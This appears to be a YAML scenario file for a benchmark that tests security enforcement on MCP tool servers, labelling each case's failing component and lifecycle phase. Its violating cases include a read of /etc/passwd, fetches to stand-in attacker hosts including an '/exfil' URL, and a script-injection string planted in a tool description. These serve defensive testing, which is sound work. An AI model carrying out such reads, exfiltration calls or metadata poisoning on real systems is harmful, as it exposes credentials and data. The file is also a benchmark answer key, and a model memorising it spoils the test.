# MCP Benchmark Scenarios
# 10 violating + 2 benign (12 total)
# Each has: id, description, transport, violating, component, lifecycle_phase, evidence_kind, failure_mode
# NOTE: failure_mode is documentation only. dual_axis localization is NOT derived from it —
# it is inferred from real signals the servers emit at runtime (denial origin, integrity
# approval baseline, overbroad-scope flag). See README "How localization is earned".
# Plus transport-specific fields: command/args/env for stdio, url/headers for http
# Components: tools, auth_infra, server
# Lifecycle phases: creation_registration, discovery, invocation_execution, update_maintenance

scenarios:

  # --- VIOLATING ---

  - id: S1
    description: "Over-broad file scope: read_file with absolute path /"
    transport: stdio
    violating: true
    component: tools
    lifecycle_phase: creation_registration
    failure_mode: over_broad_file_scope
    evidence_kind: policy_violation
    command: python
    args: ["servers/file_stdio_server/server.py"]
    env: {}
    tool: read_file
    tool_args:
      path: "/etc/passwd"

  - id: S2
    description: "Egress-policy denial: outbound fetch to blocklisted host (evil.example.org)"
    transport: http
    violating: true
    component: tools
    lifecycle_phase: invocation_execution
    failure_mode: egress_policy_denial
    evidence_kind: policy_violation
    url: "http://127.0.0.1:8001/mcp"
    headers: {}
    tool: fetch_url
    tool_args:
      url: "https://evil.example.org/data"

  - id: S3
    description: "Poisoned tool metadata: description contains script injection"
    transport: stdio
    violating: true
    component: tools
    lifecycle_phase: discovery
    failure_mode: poisoned_tool_description
    evidence_kind: metadata_violation
    command: python
    args: ["servers/file_stdio_server/server.py"]
    env: {}
    tool: read_file
    tool_args:
      path: "hello.txt"
    metadata_check:
      inject_description: "<script>alert(1)</script> Read a file"
      expect_violation: true

  - id: S4
    description: "Admission check: tool hash not in approved set — unapproved tool rejected at registration"
    transport: stdio
    violating: true
    component: tools
    lifecycle_phase: creation_registration
    failure_mode: unapproved_tool_at_admission
    evidence_kind: hash_mismatch
    command: python
    args: ["servers/file_stdio_server/server.py"]
    env: {}
    tool: read_file
    tool_args:
      path: "hello.txt"
    integrity_check:
      expected_hash: "WRONG_HASH_AAAA1111"
      resource_uri: "tool-integrity://hash"

  - id: S5
    description: "Out-of-scope token: token has wrong scope for get_secret"
    transport: http
    violating: true
    component: auth_infra
    lifecycle_phase: invocation_execution
    failure_mode: out_of_scope_token
    evidence_kind: authz_denied
    url: "http://127.0.0.1:8002/mcp"
    headers:
      Authorization: "Bearer scope-limited-token-xyz"
    tool: get_secret
    tool_args:
      key: "db_password"

  - id: S6
    description: "Unauthorized principal: blacklisted user attempts get_secret"
    transport: http
    violating: true
    component: auth_infra
    lifecycle_phase: invocation_execution
    failure_mode: unauthorized_principal
    evidence_kind: authz_denied
    url: "http://127.0.0.1:8002/mcp"
    headers:
      Authorization: "Bearer unauthorized-token-000"
    tool: get_secret
    tool_args:
      key: "api_key"

  - id: S7
    description: "Post-approval drift: tool definition modified after approval, hash diverged from registered value"
    transport: stdio
    violating: true
    component: tools
    lifecycle_phase: update_maintenance
    failure_mode: tool_drifted_after_approval
    evidence_kind: hash_mismatch
    command: python
    args: ["servers/file_stdio_server/server.py"]
    # Tool was previously approved with this baseline; the live hash now differs ->
    # the server reports approved=true, match=false (genuine post-approval drift).
    env:
      REGISTERED_TOOL_HASH: "APPROVED_HASH_CCCC3333"
    tool: read_file
    tool_args:
      path: "hello.txt"
    integrity_check:
      expected_hash: "APPROVED_HASH_CCCC3333"
      resource_uri: "tool-integrity://hash"

  - id: S8
    description: "Observability gap: real egress denial occurs but server is configured not to emit the denial trace artifact"
    transport: http
    violating: true
    component: server
    lifecycle_phase: update_maintenance
    failure_mode: missing_server_trace
    evidence_kind: observability_gap
    url: "http://127.0.0.1:8003/mcp"
    headers: {}
    tool: fetch_url
    tool_args:
      url: "https://malicious.attacker.io/exfil"
    observability_check: true
    server_trace_dir: "evidence/server_traces_s8"

  # --- DIVERGENCE SCENARIOS (expose gap between modes) ---

  - id: S11
    description: "Integrity drift detected at runtime — naive phase inference maps HASH_MISMATCH to creation_registration, GT phase is update_maintenance"
    transport: stdio
    violating: true
    component: tools
    lifecycle_phase: update_maintenance
    failure_mode: integrity_drift_detected_at_runtime
    evidence_kind: hash_mismatch
    command: python
    args: ["servers/file_stdio_server/server.py"]
    # Same earned signal as S7: an approval baseline exists and the live hash diverged
    # from it at runtime -> approved=true, match=false -> update_maintenance.
    env:
      REGISTERED_TOOL_HASH: "RUNTIME_DRIFT_HASH_9999"
    tool: read_file
    tool_args:
      path: "hello.txt"
    integrity_check:
      expected_hash: "RUNTIME_DRIFT_HASH_9999"
      resource_uri: "tool-integrity://hash"

  - id: S12
    description: "Overbroad scope surfaces as authz denial — naive component inference maps AUTHZ_DENIED to auth_infra, GT component is tools"
    transport: http
    violating: true
    component: tools
    lifecycle_phase: creation_registration
    failure_mode: overbroad_scope_manifests_as_authz_denial
    evidence_kind: authz_denied
    url: "http://127.0.0.1:8002/mcp"
    headers:
      Authorization: "Bearer scope-limited-token-xyz"
    # read_metric is registered demanding read:secrets though it only needs read:metrics.
    # The token HAS read:metrics, so the denial's root cause is the tool's own overbroad
    # scope config (tools / creation_registration), not the auth infra. The server reports
    # tool_scope_overbroad=true so the localizer can infer this without any annotation.
    tool: read_metric
    tool_args:
      name: "request_latency"

  # --- BENIGN ---

  - id: S9
    description: "Approved tool with valid scope, identity, and metadata"
    transport: stdio
    violating: false
    component: tools
    lifecycle_phase: creation_registration
    failure_mode: none
    evidence_kind: clean_execution
    command: python
    args: ["servers/file_stdio_server/server.py"]
    env: {}
    tool: read_file
    tool_args:
      path: "hello.txt"

  - id: S10
    description: "Authorized HTTP call with valid token, complete logs and traces"
    transport: http
    violating: false
    component: auth_infra
    lifecycle_phase: invocation_execution
    failure_mode: none
    evidence_kind: clean_execution
    url: "http://127.0.0.1:8002/mcp"
    headers:
      Authorization: "Bearer valid-token-abc123"
    tool: get_secret
    tool_args:
      key: "db_password"
